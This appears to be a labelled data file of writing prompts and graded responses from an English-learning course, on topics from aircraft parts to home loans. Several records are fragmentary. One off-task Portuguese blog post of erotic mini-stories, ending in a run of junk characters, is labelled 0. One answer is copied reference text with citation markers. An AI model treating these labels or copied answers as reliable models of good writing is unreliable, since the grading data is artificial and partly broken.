{"text": "Prompt Level: Aviation [SEP] Prompt: Your teacher has asked you to write a short text about the parts of an airplane. Explain what each of the different parts are for, including the fuselage, wings, tail and engines. Write 150-200 words. [SEP] Response: An airplane is made up of several important parts, each with a special job to help it fly safely and smoothly.\n\nThe **fuselage** is the main body of the airplane. It holds the passengers, cargo, and cockpit where the pilots sit and control the plane. It's the central part that connects all the other sections together.\n\nThe **wings** are attached to the sides of the fuselage. They are crucial because they create lift when air flows over them, allowing the airplane to rise off the ground. Some wings also hold fuel tanks and help with balance.\n\nAt the back of the plane is the **tail**, which includes the horizontal and vertical stabilizers. The tail helps keep the airplane stable and straight during flight. It also helps the pilot steer the plane using parts called the rudder and elevators.\n\nFinally, the **engines** provide the power needed for the airplane to move forward. Most airplanes have jet engines, which suck in air and push it out at high speed to create thrust.\n\nAll these parts work together to make sure the airplane can take off, fly, and land safely.

{"text": "Prompt Level: Police and Immigration [SEP] Prompt: Now prepare the content for an informative web page about counterfeit goods. Be sure to keep the following points in mind: Types of counterfeit goods, the effect of counterfeiting on society, the signs of a fake, what to do if you discover fake goods.  Write 250-300 words. [SEP] Response: Counterfeit consumer goods are goods illegally made or sold without the brand owner's authorization, often violating trademarks. Counterfeit goods can be found in nearly every industry, from luxury products like designer handbags and watches to everyday goods like electronics and medications. Typically of lower quality, counterfeit goods may pose health and safety risks. Various organizations have attempted to estimate the size of the global counterfeit market.[2] According to the OECD, counterfeit goods made up approximately 2.5% of global trade in 2019, with an estimated value of $464 billion.[3] Sales of counterfeit and pirated goods are projected to reach €1.67 trillion (approximately $1.89 trillion USD) by 2030. Counterfeiters can include producers, distributors or retail sellers.[26] Growing over 10,000% in the last two decades [when?], counterfeit products exist in virtually every industry sector, including food, beverages, apparel, accessories, footwear, pharmaceuticals, cosmetics, electronics, auto parts, toys, and currency. The spread of counterfeit goods are worldwide, with the International Chamber of Commerce (ICC) in 2008 having estimated the global value of all counterfeit goods at $650 billion annually, increasing to $1.77 trillion by 2015.[27] Countries mainly the U.S., U.K., Germany, Austria, Italy, France, Spain, Netherlands, Belgium, Switzerland, Denmark, Sweden, Norway, Finland, South Korea and Japan are among the hardest hit, as their economies thrive on producing high-value products, protected by intellectual property rights, including trademarks.[28] By 2017, the U.S. alone was estimated to be losing up to $600 billion each year to counterfeit goods, software piracy and the theft of copyrights and trade secrets.", "task_id": "788dc6fa-5111-4a7c-b2c1-a9ddebd0b1a2", "level_title": "Police and Immigration", "label": 5}

{"text": "Prompt Level: 13-Advanced [SEP] Prompt: A website has invited you to write your opinion on the topic of corporate social responsibility. Read the postings before you begin. Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Corporate social responsibility (CSR) has become increasingly important in recent years. As we face growing environmental and social challenges, it’s clear that companies must do more than just generate profits for shareholders. They also have a responsibility to the communities they operate in and the planet they rely on.\n\nBusinesses that prioritize sustainability and social well-being often see long-term benefits. For example, offering fair wages and safe working conditions leads to higher employee satisfaction and lower turnover. Similarly, reducing environmental impact not only protects natural resources but also improves a company’s public image and builds consumer trust.\n\nSome critics argue that CSR is just a marketing strategy, with companies spending small amounts to appear responsible without making real change. While this may be true in some cases, it’s still a step in the right direction. Even small efforts can raise awareness and set new standards. Over time, public pressure and evolving regulations will likely push companies to invest more seriously in CSR.\n\nWe may be at the beginning of a new era in business—one where profit and purpose go hand in hand. Instead of being passive observers, we should support and encourage companies that take meaningful action. Together, we can help shape a more ethical and sustainable future.", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Although it's undeniable that celebrities play a significant role in modern culture, one cannot help but question the disproportionate influence they wield over society. In many cases, they are admired not for their achievements, but for their wealth, appearance, or social media presence. It is particularly concerning that individuals with minimal talent or expertise are elevated to a status where their opinions—often uninformed or superficial—carry more weight than those of actual professionals.\n\nFurthermore, celebrity culture promotes unrealistic ideals and materialism, especially among young people. The constant display of luxury lifestyles fosters a culture of comparison, which can be damaging to mental health and self-esteem. What’s more, when celebrities are praised excessively for minor acts of kindness or “relatable” behavior, it reveals just how distorted our standards have become.\nIn short, while admiration can be justified in certain cases, the cult of celebrity often distracts us from more meaningful contributions in fields like science, education, or activism. It’s high time we re-evaluate who we celebrate and why.\nUntil we stop glorifying fame for its own sake, we risk losing sight of what truly deserves recognition in our society.", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

Once you know what's causing it, you can start to address each issue individually.\n\nFor work-related stress, consider talking to your manager about your workload or seeking support from colleagues. Sometimes, sharing your concerns can lead to practical solutions. If personal issues are the cause, try to find someone you trust to talk to. It can be a friend, family member, or even a professional counselor.\n\nAdditionally, make sure you're taking care of yourself. Regular exercise, a balanced diet, and enough sleep can significantly impact your stress levels.

Empowering your team by giving them autonomy in decision-making also fosters a sense of ownership and accountability.\n\nOn the flip side, avoid micromanaging, as it can lead to frustration and disengagement. Be careful with overly competitive environments—while healthy competition can drive performance, excessive pressure can hurt collaboration and morale. Also, avoid giving vague or unrealistic expectations, as they can lead to confusion or burnout.\n\nBest of luck!

But, recent studies have shown a change in behavior that suggests, in the future, there will be fewer cars on the road and an increase in the use of public transport.\nOne reason for this change is that young professionals use tecnology to partecipate at meetings and because they prefer use their electronic device while another people drive. They arrive at work more relaxed.\nAnother factor is the issue of sustainability. The development of public transport into a greener and more convenient option, especially in major cities. \nAnother industry undergoing changes is air travel.

{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: In the preceding units, nine writing techniques were introduced: metaphor, hyperbole, symbolism, free writing, focused free writing, loop writing, listing, questioning and cubing. Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: Among the nine writing techniques, several stand out for their versatility and effectiveness. Metaphor and symbolism are particularly useful for adding depth and layers of meaning to writing. Metaphors create vivid imagery by comparing two unlike things, helping readers understand complex ideas through familiar concepts. Symbolism, on the other hand, uses symbols to represent larger themes and ideas, enriching the narrative and inviting readers to explore deeper meanings.\n\nFree writing and focused writing are invaluable for generating ideas and refining them. Free writing allows writers to unleash their creativity without worrying about structure or correctness, often leading to unexpected insights and inspiration. Focused writing, in contrast, helps hone in on specific topics or themes, ensuring clarity and coherence in the final piece.\n\nQuestioning is another powerful technique, as it encourages critical thinking and exploration of different perspectives. By asking questions, writers can delve deeper into their subjects, uncovering new angles and insights.\n\nEach of these techniques offers unique benefits, and their effectiveness often depends on the writer's goals and the context of the writing. Combining these methods can lead to richer, more engaging, and thought-provoking work.", "task_id": "81ee255e-d4fa-4f81-b77f-dfcf3b5cf541", "level_title": "16-Upper Advanced", "label": 5}

Whether it's starting a new job, moving to a different city, or adjusting to unexpected circumstances, change challenges us to grow and adapt. Although it can be uncomfortable at first, change often brings new opportunities and fresh perspectives.\n\nMany people resist change because it brings uncertainty. It takes us out of our comfort zones and forces us to confront the unknown. However, resisting change can hold us back from reaching our full potential. By embracing it, we open the door to personal development and transformation.\n\nTo make the most of change, it’s important to stay positive, set clear goals, and remain flexible. Accepting that not everything is within our control allows us to focus on what we can influence. Even setbacks can become stepping stones toward success when we adopt a mindset of growth.\n\nSurrounding ourselves with supportive people and taking time to reflect can also help during transitons.

Type in the input box. Write 150-200 words. [SEP] Response: É de madrugada, neste domingo chuvoso a dor no peito tomou conta. No sábado passado dormiu o dia inteiro, por oras perdeu os instantes digerindo um livro e contando suas angústias para aquele que lhe cura sem falar muito. Ela pensa: “interessante a vida”, e faz isso olhando seu corpo preso em um vestido preto de malha amarrotado. Seus cabelos em desalinho, por um dia inteiro rolando na cama, e se ao menos fosse sexo, mas a única coisa que ela tinha era fazer amor consigo mesma.\n\nDiante daquele espelho em sua pequena casa, aquela forma de mulher ali exposta eram suas entranhas, todas elas dispostas numa tábua, com cebolas, tempero. Mais tarde, seria gratinada com manteiga ou azeite, e servida em linhas insones, linhas gourmet. Tomou um banho e deitou-se, nua, olhou lá fora, a brisa da tempestade saudava seu corpo como um amante. Sorriu.\n\n2 – O Homem Girassol\n\nAcordou de manhã, arrastou seu corpo cansado até o chuveiro. Embaçou suas emoções no espelho do banheiro. Sonhou com teu amor massageando-lhe as costas durante o banho. E ela disse que amava todos os vincos do rosto dele e quando ele acordava com os olhos azuis comprimidos e cheios de sono. E o sol que entrava pela janela iluminava o rosto dele, e aquilo era de uma beleza tal como um verbo irregular, ela não conseguia conjugar. Quando chovia, gotas tímidas, aquele tempo indeciso de chove não chove, seu amor era como um girassol em um jardim, ele se encolhia, tímido, e colocava-se a olhar os pés, mas quando o sol imponente se erguia no céu, ele se tornava um rei soberano, e naquele sorriso de homem silencioso, ela não conseguia exprimir em palavras o seu encanto. No canto esquerdo de uma rua, um girassol sorria no jardim.\n\n3 – Maresia de Hemingway\n\nCaminhou pelas areias fofas da praia durante várias horas. Deixou com que as marolas serenas lhe molhassem os pés. Quando seu corpo suava, ela dava um mergulho no mar, e ficou lá, meditando sobre seu eu salgado. Queria ela ter a doçura de todos os dias, mas as horas do tempo lhe trazem sabores e dissabores. Por vezes, sua natureza é amarga, outras horas ardente, nos braços daquele que a chama pra fora de sua redoma de ego e proteção.\n\nAs gaivotas se reuniam no céu, um barco pesqueiro balançava no horizonte. E ela se colocava a pensar se era a sorte ou falta dela que acompanhava aquele barco no horizonte. Depois de banhar-se e enrugar todos os vincos da pele, ela sentou-se placidamente na areia, observando a vida ao redor, crianças brincando na areia. O barco pesqueiro chegou à orla, e ele transbordava sorte e cansaço.\n\n4 – Refúgio\n\nNos papéis perdidos na escrivaninha, em meio de livros, pequenos papéis com meias verdades, com mentiras de fundo vago, cantou uma canção de melodia desconexa. Estava ali lhe fitando nos olhos, um inseto na parede, esfregando as patinhas, ela deveria matá-lo, mas apenas ligou seu ventilador de teto. E quando as hélices começaram a girar numa simplicidade complexa, ela deitou-se na cama, tinha o louvor e o desejo de um Amor não incontido, verborrágico e jogado na sorte, algo ao qual ela não poderia comprar. Os ponteiros de seu relógio de parede pararam. Tinha ela, de comprar pilhas novas?Não, ela queria ali, poder voltar no tempo, e ficar apenas naquele instante que ela tentou em vão manter sua eloquência de raciocínio, antes de ser tomada por um beijo doce e inesperado no seio direito, e mãos tão maliciosas na graça de um anjo diabólico passeando em sua virilha. Desejo.\n\n5 – Domingo à tarde.\n\nEnquanto algumas pessoas rezam indo à missa ou contam piadas na mesa de família, a tarde pedia um banho. Ela negava que naquele momento, as gotas que  caiam no corpo, trouxeram-lhe a doce lembrança de um pequeno rio de vinho correndo nas costas, e uma língua languida. E os dois, talvez, levados pela sensação de uma leve embriaguez, cravou em seu peito e armário de memórias, um momento inesquecível e único. E naquele momento, enquanto as gotas mornas tiravam-lhe a eloquência de raciocínio, ela queria que ele estivesse ali, com seus beijos em sua pele nua. Cada momento, que ela sentia algo escorrer-lhe nas costas, ela sentia o cheiro dele aproximando-se.  Seu toque, ora doce, ora selvagem, uma sinestesia violenta, uma vontade de amar-lhe imoralmente na frente de uma multidão. E o som de piano tomou espaço n’alma. Ela enxugou seu desejo com uma toalha felpuda.\n\n6 – Inverno\n\nPerdeu a beleza dos instantes. Adormeceu no metrô, não viu o título do livro nas mãos do homem que estava sentado ao teu lado. Apenas gravou seu cheiro de água de banho. Em seu sonho de preguiça  numa manhã de uma metrô lotado, ela estava abraçando o tempo e seus ponteiros, e não largava, o enchia de beijos e deixava-lhe  invadir seu ventre numa fúria inconstante. Estava chovendo, e havia neblina lá fora. Nos túneis tristes do metrô há apenas a escuridão, e o monstro de ferro a toda velocidade carregando pessoas encharcadas de sonhos, esperando um pouco de atenção, uma alma de cores entrando em seus mundinhos de tons tempestuosos. Ela continuou ali sonhando, amando a frieza do inverno, e a eloquência de se proteger por debaixo de dezenas de roupas. O inverno silencioso calava sua alma, e diante de  tal beleza, ela se contorcia por dentro.\n\n7 – Delírio\n\nDo alto da sacada de seu apartamento, Lola colocou-se a pensar no tempo e em delírios. Havia uma varejeira grande e verde rodeando o vidro da janela, desejando as migalhas de comida da mesa. Sorte que a porta está fechada. Aquela mosca nojenta poderia entrar e pousar na sua comida, ou nas suas emoções perdidas durante a noite de sono. Segurava uma xícara de café, sua vida insone clamava por cafeína todas as manhãs. A insônia era uma (in)sanidade que a perseguia de noite, debaixo de cobertas, embaixo das hélices barulhentas de seu ventilador de teto, mas dentro dela, um silêncio devastador, que pode ser escutado na banda de pensamentos tão altos quanto o barulho de uma fanfarra em dia da independência. Era um silêncio, quieto, e muitas vezes inoportuno. Seu grito é uma canção muda, escutado por poucas pessoas. Talvez aquela mosca na janela a compreendesse. Porque não?\n\n8 – Mosca\n\nO vento balançava seus cabelos, do alto daquela sacada a vida era miúda, mas não deixava de ser bonita. Era como suas olheiras. Era um fruto trágico, mas ela gostava. A insônia não a tornava mais feia, a Beleza é relativa. Noites mal dormidas tinham seu “q” de beleza. Ela poderia tirar o sábado para dormir, deitar um pouco de suas emoções na luz do dia, e acordar de madrugada para fazer uma xícara de chá e sentar-se na sacada do apartamento, observar estrelas e imaginar uma cena de um quadro surrealista, e talvez cantarolar alguma canção oportuna para aquele dia, cantar baixinho, como o zunzum da mosca inquieta e gulosa que rodeava o vidro. A mosca estava faminta. Se Lola tivesse olhos de microscópio, enxergaria a salivação daquela mosca, suas 4 pupilas dilatadas, lembrou das aulas de Biologia.  Uma mosca pode ter de dois a quatro olhos.\n\n9 – Isabela\n\nIsabela sonhava que estava voando por cima de um campo cheio de lírios, leve como uma borboleta, e o desabrochar de um milhão de flores tímidas encharcadas de lirismo enalteciam sua alma. Ela já estivera ali antes, em tempos remotos, andando em uma velha bicicleta amarela, já enferrujada pela umidade do tempo. E ela corria naquele campo. Nem os urubus na arvorezinha de galhos retorcidos e secos, tiravam a beleza daquele lugar. Naquele sonho, naquele lugar que ela poderia chamar de seu, amanhecia um dia de cores multicoloridas, e seu desejo incontido de ser a nuance principal daquele jardim de delícias e prazeres angelicais, se diluíam quando ela escutou o despertador a chamar para a realidade. Ela que estava tão confortável embaixo de suas cobertas protetoras, acordou com o som do carro de gás que passava na rua e com o latido incontrolável do seu cão. Sentou e chorou.\n\n10 – Irregular\n\nA Beleza é um verbo irregular ao qual não se conjuga. Renata escreveu no guardanapo de papel que seu pai colocou em cima da mesa do café. Embrulhou o papel e meteu ele num cantinho da bolsa. Iria para a faculdade naquela manhã, e estava entediada. Dias de tédio a fazem escrever momentos e lapsos de razão ou a falta dela, em meio de linhas tortas e sonolentas. Ela estava ali, presente de corpo físico, mas ali, nas aulas inúteis, ela pensava apenas em anjos e bisões extintos.  Pensando em seu esconderijo no refúgio da arte, que poderia ter tanto sentido para ela e Humbert Humbert de Vladimir Nabokov e sua Lolita imortalizada. Pensou na imortalidade de seu Amor, ele era como o cântico das baleias, teria de navegar longe para poder ouvi-lo, desamarrar seu barco de beira mar, e navegar em direção da beleza irregular dos olhos dele.\n\n \n\nMiniconto extra. Presente para os meus leitores.\n\n11 – Trânsito\n\nLançava-se nos passos na pressa incalculável. De repente, o tempo parou, seus passos diminuíram. Ficaram tímidos, como os olhos dos súditos ao soberano. Na floricultura, da esquina um lindo rapaz com um vaso de lírios. Ele saiu e foi em sua direção com um sorriso. E naquele instante, ela mirou a Beleza sem baixar os olhos. Encarou o verbo irregular, Beleza era teu nome. Estava ali o refúgio da arte que ela tão timidamente não acreditava que pudesse existir. Ela suspirou e perdeu a respiração. Seus olhos de ressaca fecharam-se, e seu corpo padecia no asfalto com pessoas ao redor feito urubus. O rapaz dos lírios foi quem atirou o lençol em seu corpo esmagado pela linha 331. A Beleza a encarou, tirando-lhe toda a razão. O tempo pra ela não tinha mais conjugações e a Beleza com lírios nas mãos exclamou: “Ela não olhou a rua ao atravessar.”\n\nAvalie isto:11 Votes\nGostou?Compartilhe o texto amador!\n 18+ Facebook E-mail\nCarregando...\nRelacionado\nO espelho dell’ Arte\n11 de junho de 2013\nEm \"Memórias da madrugada\"\nDona Rita e a Fonte da Juventude de Lucas Cranach.\n6 de abril de 2013\nEm \"Prosa\"\nMemórias de um homem no espelho do banheiro.\n18 de março de 2013\nEm \"Prosa\"\nEtiquetadoamorartebaleiasbarcoespelhofalta de sorteGirassolHemingwayinvernoLírioslolitaminicontosmoscaolhos azuispesqueirorefúgiosorteTempotrânsitoverbo irregular\nNavegação de posts\nA imortalidade do Amor na escritaInstantes\nComente! \nBlog no WordPress.com.\ngggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg", "task_id": "4e353d7c-e4d6-403b-bc38-4f6b008b0783", "level_title": "14-Advanced", "label": 0}
{"text": "Prompt Level: Oil and Gas Industry [SEP] Prompt: Use your notes to help you write the report. Make sure you follow the correct structure and conventions. Write 150-200 words. [SEP] Response: \n\nThe purpose of this report is to provide a preliminary assessment of the oil and gas resources in the newly opened Carlos Fields. The summary information in this report gives what we believe is a reasonable initial overview of each of the different commodities present, although the amount and quality of data for each commodity varies.\n\nFindings\n\nForty-seven wildcat wells have been drilled within the field. Petroleum shows have been found in Triassic, Permian, Devonian, and Cambrian age rocks. These shows were in the form of petroleum recovered from drill-stem or production tests in wells and live oil stains in drilling cuttings. Sixty-three percent of the wells drilled in the plateau tested only the Permian section. Just five wells tested the Mississippian and Devonian sections, and only three penetrated the Precambrian.\n\nOur survey indicates that the field contains all the elements necessary for major oil and gas accumulations: source rocks, reservoirs, and trapping mechanisms. Commercial deposits of oil have been discovered both within and along the margins of the region. Although the characteristics of the field are favorable for the accumulation of oil and gas, wildcat density is extremely sparse. Although the exploration risk is high, the monument could contain major accumulations of oil based on the production history of the field and geologic evidence.\n\nConclusion\n\nIn summary, we estimate the ultimate recovery from Cotton Valley field at about 21 million barrels of oil. With tertiary recovery techniques and new technological advances in enhanced oil recovery should help exceed the estimated amount. However, the evaluation of potential petroleum resources presented in this report is based on a limited amount of information.\n\nRecommendations\n\nIn our view, it is crucial that a detailed, combined geologic-engineering evaluation be conducted of the oil, gas and coal resources in the area. This would require us to acquire new and compile existing seismic data, produce detailed structural contour maps for each potential reservoir, model the basic source rock parameters and calculate petroleum volumetrics for each of the potential rocks.", "task_id": "b99c403f-3a8e-4397-a157-2644d1952584", "level_title": "Oil and Gas Industry", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Criticizing celebrities or the concept of celebrity culture can be a delicate task. Here’s a general critique of the idea of celebrity:\n\nThe phenomenon of celebrity culture often glorifies individuals for superficial reasons, such as their appearance or social media presence, rather than their genuine contributions to society. This can lead to a distorted sense of values, where fame and wealth are prioritized over integrity and hard work. Celebrities are frequently placed on pedestals, creating unrealistic standards that can negatively impact the self-esteem of their followers. Moreover, the constant scrutiny and invasion of privacy that celebrities endure can be detrimental to their mental health, highlighting the toxic nature of fame. The media’s obsession with celebrities also diverts attention from more pressing global issues, such as climate change and social justice, which deserve greater focus and action. In essence, while the allure of celebrity can be captivating, it often promotes a culture that is shallow and disconnected from the realities and challenges faced by everyday people.", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: Hi Harry,\n\nThere is a huge difference in a team’s productivity when its members are motivated versus when they are not. Motivation is the driving force behind any employee’s performance, so a good manager should make it a priority. Here are some key strategies to ensure your team stays engaged and motivated:\n\nSet clear objectives together: Collaborate with your employees to define their individual goals and recognize their existing skills.\nEstablish a reward system: Clear incentives for reaching milestones will naturally increase competition and make the team more dynamic.\nRecognize their efforts: Praise employees when they do a good job—it boosts morale and reinforces positive behavior.\nBuild strong relationships: Organize team-building activities to create a comfortable and trusting environment.\nEncourage participation: Ask for their opinions and involve them in decisions so they feel valued and part of the company.\nAt the same time, it’s important to avoid behaviors that demotivate employees. A common mistake is showing disrespect simply because you hold a leadership position. Respect and appreciation go a long way in building a motivated and high-performing team.\n\nBest regards,\nFadila", "task_id": "b4ba34ff-949d-4a82-9f56-ea472f177a71", "level_title": "13-Advanced", "label": 5}

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Language learning is a fascinating yet challenging journey. Students often encounter various issues and obstacles along the way. Let’s explore some of these challenges and consider guiding questions to help organize our thoughts. Pronunciation can be tricky due to unfamiliar sounds and intonations. Students often find it hard to mimic native speakers, leading to frustration. Regular practice with native speakers or using language apps can help. Grammar rules can be complex and different from a student’s native language. Understanding and applying these rules requires patience and practice. Breaking down rules into manageable chunks and using them in context can be beneficial. Memorizing new words and phrases can be overwhelming. Using flashcards, spaced repetition systems, and incorporating new vocabulary into daily conversations can enhance retention. Language is deeply intertwined with culture. Understanding cultural nuances, idioms, and expressions is crucial for effective communication. Immersing oneself in the culture through media, literature, and interactions with native speakers can provide valuable insights.

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Corporate Social Responsibility (CSR) has become a key focus for businesses today, as companies are increasingly expected to contribute to societal and environmental well-being alongside their financial success. CSR involves actions like reducing carbon footprints, supporting local communities, and ensuring fair labor practices, with the goal of creating a positive impact beyond profit-making. In this context, companies that prioritize CSR may enhance their brand image, foster customer loyalty, and attract employees who value ethical practices. Many believe that businesses have a role to play in addressing global challenges, such as climate change and poverty, by leveraging their resources and influence for good.\n\nHowever, CSR also faces criticism. One concern is that some companies use CSR as a marketing tool, engaging in \"greenwashing\" or making superficial efforts to improve their public image without committing to real, lasting change. Critics argue that CSR should not be the responsibility of businesses but rather of governments and non-profit organizations. Without clear regulations or oversight, CSR initiatives can lack transparency and fail to achieve meaningful results. Additionally, there is the issue of consumer fatigue, where people become skeptical of companies that make grand claims about their social contributions without showing substantial impact.\n\nUltimately, CSR is a complex issue, and its effectiveness depends on companies' genuine commitment to social responsibility, as well as their ability to deliver measurable, positive outcomes. It remains an open question whether CSR will evolve into a true force for good or whether it will remain more of a strategy to enhance corporate reputation. What are your thoughts—do you believe CSR is an authentic effort to make a difference, or is it just a corporate tactic to improve public image?", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

[SEP] Response: \nThe Chicago Seven Verdict\nThe jury was initially split, with eight jurors voting to convict defendants on charges of both the conspiracy and intent to incite riots, and four jurors voting to acquit the defendants on all charges. The foreman handed a hung-jury message to the marshal to take to the judge, but he instructed the jury to keep deliberating.\n\nIn the end, on February 18, 1970, all seven defendants were found not guilty on the conspiracy charges, two were acquitted completely, and five were convicted of inciting to riot. These five were each sentenced to five years' imprisonment and fined $5,000 on February 20, 1970. The convictions were all reversed on appeal by the United States Court of Appeals for the Seventh Circuit on November 21, 1972. The reasons for the reversal involved bias by the judge and his refusal to permit defense attorneys to question prospective jurors regarding cultural bias. The Justice Department decided not to re-try the case.\n\nDuring the trial, all the defendants and both defense attorneys were cited for contempt and sentenced to jail, but those convictions were also overturned. The contempt charges were re-tried before a different judge, who found four people guilty of some of the charges, but decided not to sentence the defendants to jail or fines.\n", "task_id": "10c9bef1-d410-4e08-a1f9-51f7dbfe0aac", "level_title": "Law", "label": 5}

[SEP] Response: Space travel has evolved from heroic missions to practical work, but it may soon become a form of tourism. Millionaires like Dennis Tito and Mark Shuttleworth have already paid $20 million each for short space trips, and surveys show growing interest if prices drop. In the future, space tourism could become a booming industry, with thousands willing to pay for even brief experiences in space. Entrepreneurs like Robert Bigelow are planning to build comfortable space habitats with beds, dining areas, and even slot machines. Though some experts warn that space is still too dangerous for mass tourism, companies will likely continue to develop infrastructure. If safety improves and costs fall, people might soon be packing for vacations in space, deciding whether to bring their spacesuits or stylish outfits. Space tourism could be just around the corner.\n\n", "task_id": "8ccc73b1-95ed-4b71-8fc5-065b57a0f5f0", "level_title": "Travel Industry", "label": 5}

[SEP] Response: In my country, robots are increasingly being integrated into various sectors, transforming the way we live and work. They are being used in manufacturing, healthcare, transportation, and even education. Robots are improving efficiency, productivity, and accuracy, freeing humans from mundane and repetitive tasks. I feel that robots have the potential to greatly benefit society, but also raise concerns about job displacement and dependency on technology. On the positive side, robots will enhance healthcare outcomes, improve safety in hazardous environments, and increase accessibility for people with disabilities. However, they may also lead to job losses, particularly in sectors where tasks are repetitive or can be easily automated. Moreover, over-reliance on robots could diminish human skills and interactions. As robots become more prevalent, it's essential to address these concerns and ensure that their integration benefits society as a whole.\n \nFurthermore, robots will also have a significant impact on the education sector, enabling personalized learning experiences and enhancing student engagement.\n ", "task_id": "01e27f6c-3c08-4d7c-8c58-fbe93505be01", "level_title": "16-Upper Advanced", "label": 5}

[SEP] Response: My Job as a Data Analyst and Web Developer at ADM\n\nI currently work as a Data Analyst and Web Developer at Archer Daniels Midland Company (ADM), one of the world’s leading agricultural processing companies. In this role, I combine my passion for data with my technical skills to create innovative solutions that drive efficiency and deliver valuable insights for the company.\n\nOne of my main responsibilities is the development and maintenance of dashboards in Power BI. I work with large datasets daily, analyzing information related to production, logistics, inventory, and operational performance. I design interactive dashboards that allow managers and team members to track KPIs, identify bottlenecks, and make data-driven decisions quickly.\n\nAnother key part of my job involves automation. I create scripts and workflows using Power Automate, Python, and Excel (VBA/Power Query) to automate repetitive tasks, such as consolidating daily reports, extracting data from PDFs, and integrating information from various systems. This not only saves time but also reduces the risk of human error.\n\nIn addition, I build applications using Power Apps that streamline internal processes. For example, I developed an app to manage meeting room bookings, ensuring that overlapping schedules are avoided and users can easily check room availability. These low-code solutions help improve communication and organization across departments.\n\nI also collaborate closely with the IT and production teams to gather requirements, identify problems, and propose technical solutions. My background in Systems Analysis and Chemical Engineering gives me a unique perspective, allowing me to understand both technical and operational challenges.\n\nOutside of work, I’m constantly learning. I study cybersecurity, front-end development (React, HTML, CSS, JavaScript), and cloud computing with the goal of becoming a cloud engineer.

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Learning a new language can be both exciting and challenging. What are the most common obstacles students encounter, and how can they overcome them? One major challenge is fear of making mistakes. Many learners feel embarrassed when they pronounce words incorrectly or use the wrong grammar. This fear can prevent them from practicing, which slows down progress. How can students build confidence? Practice in a supportive environment is key. Joining language exchange groups or using language apps can provide low-pressure opportunities to speak.\n\nAnother issue is lack of exposure. How often do students hear the language outside the classroom? Limited exposure to native speakers or authentic content can make it difficult to develop listening and speaking skills. Watching movies, listening to music, and reading books in the target language can help.\n\nFinally, motivation can be hard to maintain. Why do some students lose interest? If progress feels slow or the material is not engaging, learners may give up. Setting clear goals and tracking progress can make a big difference. In summary, while learning a language comes with challenges like fear, lack of exposure, and motivation loss, students can overcome them through regular practice, immersive experiences, and staying motivated.\n\n\n\n\n", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

Write the report as clearly and concisely as possible. Write 150-200 words. [SEP] Response: \nSection: Observations and Recommendations on Psychological Operations (PsyOps)\nThe PsyOps component of the exercise was a significant area of concern, largely contributing to an overall sense of disappointment. Key observations include the late decision-making regarding the content of political messages for leaflets, which severely impacted planning and execution. Furthermore, the Civil Exercise Cell, crucial for these operations, was notably understaffed and lacked experienced personnel, indicating a need for improved leadership and resourcing. Communication and language barriers between this cell and the military PsyOps team also proved detrimental. This resulted in issues such as aircraft dropping incorrect leaflets in wrong areas and, more critically, led to protests from the host nation and observers regarding leaflet content and language.\nTo address these deficiencies, it is recommended that a clearer, earlier decision-making process for PsyOps content be established. The Civil Exercise Cell must be adequately staffed with trained professionals and provided with strong leadership. Crucially, efforts should be made to enhance language capabilities and foster seamless liaison between all units involved in PsyOps, ensuring coordinated and effective communication to prevent future operational failures and diplomatic issues.\n", "task_id": "1dc879f7-2765-4ba4-90f6-522fa596e03c", "level_title": "Military", "label": 5}

{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: Write about buying a home and applying for a home loan in your country. How easy or difficult is the process? Are there a lot of forms to fill out? Is housing expensive? What are the interest rates? Do you need to use a real estate agent or mortgage broker? Type in the input box. Write 200-250 words. [SEP] Response: Buying a home and applying for a home loan in Italy can be a complex process, especially for first-time buyers. The first step is usually to find a suitable property, often with the help of a real estate agent. In most cases, people prefer to use an agent because they can guide buyers through the legal and bureaucratic steps, which can be overwhelming.\n\nOnce a property is chosen, the next step is applying for a mortgage. This involves preparing a lot of paperwork, including proof of income, bank statements, tax returns, and identification documents. Banks in Italy are very strict about checking the financial stability of applicants. Generally, the bank will only approve a loan if the monthly payment does not exceed 30-35% of the borrower’s income.\n\nInterest rates can vary depending on the type of loan. Fixed rates are more stable but usually slightly higher, while variable rates can be lower at first but may increase over time. As of 2024, average interest rates for mortgages in Italy are around 3-4%.\n\nOverall, housing in Italy can be expensive, especially in major cities like Milan and Rome. However, the government offers some incentives for young people and first-time buyers, which can help make the process more accessible.", "task_id": "e56737ef-22af-472e-88bd-a73361bcb7d9", "level_title": "16-Upper Advanced", "label": 5}

